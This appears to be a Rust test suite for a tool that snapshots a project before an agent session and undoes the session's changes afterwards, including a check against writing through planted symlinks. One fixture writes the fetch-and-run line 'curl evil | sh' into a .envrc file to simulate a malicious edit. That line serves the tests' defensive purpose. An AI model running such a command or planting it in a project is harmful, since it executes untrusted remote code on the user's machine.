use super::*;
use std::fs;

fn write(root: &Path, rel: &str, text: &str) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, text).unwrap();
}

fn opts(max: u64, reflink: bool) -> Opts {
    Opts {
        max,
        time_limit: Duration::from_secs(20),
        reflink,
    }
}

fn fp(size: u64, mtime: i64) -> Fp {
    Fp {
        size,
        mtime,
        mode: 0o644,
        link: None,
    }
}

fn meta(files: &[(&str, Fp)], end: Option<&[(&str, Fp)]>) -> Meta {
    let map = |v: &[(&str, Fp)]| v.iter().map(|(k, f)| (k.to_string(), f.clone())).collect();
    Meta {
        id: "s1".into(),
        harness: "fake".into(),
        project: "/p".into(),
        started: 0,
        ended: None,
        reflink: false,
        bytes: 0,
        skip: Skip::default(),
        files: map(files),
        end: end.map(map),
    }
}

fn has_git() -> bool {
    std::process::Command::new("git")
        .arg("--version")
        .output()
        .is_ok_and(|o| o.status.success())
}

fn git(dir: &Path, args: &[&str]) {
    let ok = std::process::Command::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .unwrap()
        .status
        .success();
    assert!(ok, "git {args:?}");
}

#[test]
fn non_git_skip_rules_leave_out_build_folders_and_git_at_any_depth() {
    let t = tempfile::tempdir().unwrap();
    let p = t.path();
    for f in [
        "src/main.rs",
        "target/debug/x",
        "web/node_modules/a/index.js",
        ".venv/bin/python",
        "dist/app.js",
        "sub/build/out.o",
        ".git/HEAD",
        "vendor/lib/.git",
        "notes/build",
    ] {
        write(p, f, "x");
    }
    let skip = Skip {
        names: true,
        paths: BTreeSet::new(),
    };
    let files: Vec<String> = walk(p, &skip, None).unwrap().into_keys().collect();
    // A file called `build` stays: only folders are left out.
    assert_eq!(files, vec!["notes/build", "src/main.rs"]);
}

#[test]
fn git_skip_rules_take_ignored_folders_only() {
    let s = Skip::from_git("out/\0a.log\0web/node_modules/\0");
    assert!(!s.names);
    assert_eq!(
        s.paths.iter().cloned().collect::<Vec<_>>(),
        vec!["out", "web/node_modules"]
    );
    assert!(s.skips("out", "out", true));
    assert!(s.skips("x/.git", ".git", false));
    assert!(!s.skips("a.log", "a.log", false));
    assert!(!s.skips("target", "target", true));
}

#[test]
fn git_skip_rules_come_from_the_hardened_host_git() {
    if !has_git() {
        println!("skipped: no git");
        return;
    }
    let t = tempfile::tempdir().unwrap();
    let p = t.path();
    git(p, &["init", "-q"]);
    write(p, ".gitignore", "out/\n*.log\n");
    write(p, "out/bin", "x");
    write(p, "a.log", "x");
    write(p, "src/a.rs", "x");
    // Not ignored in this repository: a folder name alone means nothing.
    write(p, "target/keep", "x");
    let s = skip_rules(p, Duration::from_secs(20));
    assert!(!s.names);
    assert!(s.paths.contains("out"), "{s:?}");
    let files: Vec<String> = walk(p, &s, None).unwrap().into_keys().collect();
    assert_eq!(
        files,
        vec![".gitignore", "a.log", "src/a.rs", "target/keep"]
    );
}

#[test]
fn outside_git_the_skip_rules_use_folder_names() {
    let t = tempfile::tempdir().unwrap();
    let s = skip_rules(t.path(), Duration::from_secs(20));
    assert!(s.names);
}

#[test]
fn config_and_sizes() {
    assert_eq!(parse_size("500M"), Some(500_000_000));
    assert_eq!(parse_size("2G"), Some(2_000_000_000));
    assert_eq!(parse_size("800KB"), Some(800_000));
    assert_eq!(parse_size("1000"), Some(1000));
    assert_eq!(parse_size("lots"), None);
    assert_eq!(Config::parse("").unwrap(), Config::default());
    let c = Config::parse("[snapshot]\nenabled = false\nmax = \"1G\"\n").unwrap();
    assert!(!c.enabled);
    assert_eq!(c.max, 1_000_000_000);
    assert!(Config::parse("[snapshot]\nmax = \"big\"\n").is_err());
    assert!(Config::parse("[snapshot]\nkeep = 3\n").is_err());
}

#[test]
fn a_full_copy_over_the_limit_is_skipped() {
    let t = tempfile::tempdir().unwrap();
    let (p, root) = (t.path().join("p"), t.path().join("snaps"));
    write(&p, "a", &"x".repeat(600));
    write(&p, "b", &"y".repeat(600));
    match take(&root, &p, "s1", "fake", 1, &opts(1000, false)).unwrap() {
        Taken::Skipped(why) => assert!(why.contains("[snapshot] max"), "{why}"),
        t => panic!("{t:?}"),
    }
    assert!(list(&project_dir(&root, &p)).is_empty());
    // No temporary folder stays behind.
    let left: Vec<_> = fs::read_dir(project_dir(&root, &p)).unwrap().collect();
    assert!(left.is_empty());
    match take(&root, &p, "s1", "fake", 1, &opts(2000, false)).unwrap() {
        Taken::Done { files, bytes, .. } => assert_eq!((files, bytes), (2, 1200)),
        t => panic!("{t:?}"),
    }
}

#[test]
fn the_plan_names_added_changed_deleted_and_late_changes() {
    let m = meta(
        &[
            ("same", fp(1, 1)),
            ("edit", fp(1, 1)),
            ("gone", fp(1, 1)),
            ("late", fp(1, 1)),
        ],
        Some(&[
            ("same", fp(1, 1)),
            ("edit", fp(2, 2)),
            ("new", fp(1, 2)),
            ("late", fp(1, 1)),
        ]),
    );
    let current: BTreeMap<String, Fp> = [
        ("same", fp(1, 1)),
        ("edit", fp(2, 2)),
        ("new", fp(1, 2)),
        ("late", fp(5, 9)),
        ("later", fp(1, 9)),
    ]
    .into_iter()
    .map(|(k, f)| (k.to_string(), f))
    .collect();
    let p = plan(&m, &current);
    let got: Vec<(&str, Change, bool)> = p
        .entries
        .iter()
        .map(|e| (e.path.as_str(), e.change, e.after_end))
        .collect();
    assert_eq!(
        got,
        vec![
            ("edit", Change::Changed, false),
            ("gone", Change::Deleted, false),
            ("late", Change::Changed, true),
            ("later", Change::Added, true),
            ("new", Change::Added, false),
        ]
    );
    // Without an end record nothing counts as late.
    let m = meta(&[("late", fp(1, 1))], None);
    assert!(!plan(&m, &current).entries[0].after_end);
    let text = render_plan(&m, &plan(&m, &current));
    assert!(text.contains("added"), "{text}");
}

#[test]
fn names_cut_the_list() {
    let es: Vec<Entry> = (0..13)
        .map(|i| Entry {
            path: format!("f{i:02}"),
            change: Change::Added,
            after_end: false,
        })
        .collect();
    let refs: Vec<&Entry> = es.iter().collect();
    assert!(names(&refs, 10).ends_with("f09, +3 more"));
}

fn content(root: &Path) -> BTreeMap<String, Vec<u8>> {
    walk(root, &Skip::default(), None)
        .unwrap()
        .into_iter()
        .map(|(k, f)| {
            let v = match f.link {
                Some(t) => t.into_bytes(),
                None => fs::read(root.join(&k)).unwrap(),
            };
            (k, v)
        })
        .collect()
}

#[test]
fn undo_brings_the_project_back_and_keeps_added_files_in_the_trash() {
    let t = tempfile::tempdir().unwrap();
    let (p, root, trash) = (
        t.path().join("p"),
        t.path().join("snaps"),
        t.path().join("trash"),
    );
    write(&p, "src/main.rs", "fn main() {}\n");
    write(&p, "src/lib.rs", "pub fn x() {}\n");
    write(&p, "README", "hello\n");
    write(&p, "node_modules/pkg/index.js", "big\n");
    write(&p, ".git/HEAD", "ref: refs/heads/main\n");
    std::os::unix::fs::symlink("src/main.rs", p.join("link")).unwrap();
    fs::set_permissions(p.join("README"), fs::Permissions::from_mode(0o600)).unwrap();
    let before = content(&p);
    let mtimes = walk(&p, &Skip::default(), None).unwrap();

    let dir = match take(&root, &p, "s1", "fake", 1, &opts(1 << 20, false)).unwrap() {
        Taken::Done { dir, files, .. } => {
            // node_modules and .git are not in the snapshot.
            assert_eq!(files, 4);
            dir
        }
        t => panic!("{t:?}"),
    };

    // The run: change, add, delete, and an added file in a new folder.
    std::thread::sleep(Duration::from_millis(20));
    write(&p, "src/main.rs", "fn main() { evil() }\n");
    write(&p, ".envrc", "curl evil | sh\n");
    write(&p, "new/dir/f", "x");
    fs::remove_file(p.join("src/lib.rs")).unwrap();
    write(&p, "node_modules/pkg/index.js", "changed\n");
    write(&p, ".git/HEAD", "changed\n");
    assert_eq!(finish(&root, &p, "s1", 2).unwrap(), Some(4));

    let m = Meta::load(&dir).unwrap();
    let current = walk(&p, &m.skip.union(&skip_rules(&p, TIME_LIMIT)), None).unwrap();
    let pl = plan(&m, &current);
    assert_eq!(pl.of(Change::Added).len(), 2);
    assert_eq!(pl.of(Change::Changed).len(), 1);
    assert_eq!(pl.of(Change::Deleted).len(), 1);
    let r = restore(&dir, &m, &p, &pl, false, &trash, "t1").unwrap();
    assert_eq!(r.trashed, vec![".envrc", "new/dir/f"]);
    assert_eq!(r.restored, vec!["src/lib.rs", "src/main.rs"]);

    // The project equals the snapshot, ignored folders and .git untouched.
    let after = content(&p);
    assert_eq!(
        fs::read_to_string(p.join(".git/HEAD")).unwrap(),
        "changed\n"
    );
    assert_eq!(
        fs::read_to_string(p.join("node_modules/pkg/index.js")).unwrap(),
        "changed\n"
    );
    let mut want = before.clone();
    want.insert("node_modules/pkg/index.js".into(), b"changed\n".to_vec());
    assert_eq!(after, want);
    assert!(!p.join("new").exists(), "the empty added folder is gone");
    let restored = walk(&p, &m.skip.union(&skip_rules(&p, TIME_LIMIT)), None).unwrap();
    assert_eq!(restored, m.files);
    assert_eq!(restored["src/lib.rs"].mtime, mtimes["src/lib.rs"].mtime);
    assert_eq!(restored["README"].mode, 0o600);
    // The added files are in the trash.
    assert_eq!(
        fs::read_to_string(trash.join("t1/.envrc")).unwrap(),
        "curl evil | sh\n"
    );
    assert!(trash.join("t1/new/dir/f").is_file());
}

#[test]
fn undo_skips_files_changed_after_the_end_unless_forced() {
    let t = tempfile::tempdir().unwrap();
    let (p, root, trash) = (
        t.path().join("p"),
        t.path().join("snaps"),
        t.path().join("trash"),
    );
    write(&p, "a", "1");
    write(&p, "b", "1");
    let Taken::Done { dir, .. } = take(&root, &p, "s1", "fake", 1, &opts(1 << 20, false)).unwrap()
    else {
        panic!()
    };
    write(&p, "a", "agent");
    write(&p, "b", "agent");
    finish(&root, &p, "s1", 2).unwrap();
    // The user edits b after the session.
    write(&p, "b", "user edit");
    let m = Meta::load(&dir).unwrap();
    let pl = plan(&m, &walk(&p, &m.skip, None).unwrap());
    let r = restore(&dir, &m, &p, &pl, false, &trash, "t1").unwrap();
    assert_eq!(r.skipped, vec!["b"]);
    assert_eq!(fs::read_to_string(p.join("a")).unwrap(), "1");
    assert_eq!(fs::read_to_string(p.join("b")).unwrap(), "user edit");
    let pl = plan(&m, &walk(&p, &m.skip, None).unwrap());
    restore(&dir, &m, &p, &pl, true, &trash, "t2").unwrap();
    assert_eq!(fs::read_to_string(p.join("b")).unwrap(), "1");
}

#[test]
fn undo_does_not_write_through_a_planted_link() {
    let t = tempfile::tempdir().unwrap();
    let (p, root, trash, outside) = (
        t.path().join("p"),
        t.path().join("snaps"),
        t.path().join("trash"),
        t.path().join("outside"),
    );
    write(&p, "src/a", "original");
    fs::create_dir_all(&outside).unwrap();
    let Taken::Done { dir, .. } = take(&root, &p, "s1", "fake", 1, &opts(1 << 20, false)).unwrap()
    else {
        panic!()
    };
    fs::remove_dir_all(p.join("src")).unwrap();
    std::os::unix::fs::symlink(&outside, p.join("src")).unwrap();
    let m = Meta::load(&dir).unwrap();
    let pl = plan(&m, &walk(&p, &m.skip, None).unwrap());
    restore(&dir, &m, &p, &pl, false, &trash, "t1").unwrap();
    assert!(fs::read_dir(&outside).unwrap().next().is_none());
    assert!(fs::symlink_metadata(p.join("src")).unwrap().is_dir());
    assert_eq!(fs::read_to_string(p.join("src/a")).unwrap(), "original");
    assert!(fs::symlink_metadata(trash.join("t1/src"))
        .unwrap()
        .is_symlink());
}

#[test]
fn only_the_last_snapshots_stay() {
    let t = tempfile::tempdir().unwrap();
    let (p, root) = (t.path().join("p"), t.path().join("snaps"));
    write(&p, "a", "1");
    for i in 0..(KEEP as u64 + 2) {
        take(
            &root,
            &p,
            &format!("s{i:02}"),
            "fake",
            i,
            &opts(1 << 20, false),
        )
        .unwrap();
    }
    let all = list(&project_dir(&root, &p));
    assert_eq!(all.len(), KEEP);
    assert_eq!(all[0].1.id, format!("s{:02}", KEEP + 1));
    assert!(render_list(&all).contains("fake"));
}

#[test]
fn reflink_snapshots_share_data_where_the_file_system_can() {
    let t = tempfile::tempdir().unwrap();
    let (p, root) = (t.path().join("p"), t.path().join("snaps"));
    write(&p, "a", &"x".repeat(10_000));
    // A limit far below the project: only shared data fits.
    match take(&root, &p, "s1", "fake", 1, &opts(10, true)).unwrap() {
        Taken::Done { reflink, .. } => {
            assert!(reflink);
            let m = Meta::load(&project_dir(&root, &p).join("s1")).unwrap();
            assert!(m.reflink);
        }
        Taken::Skipped(why) => {
            println!("skipped: the temporary folder cannot share file data ({why})")
        }
    }
}
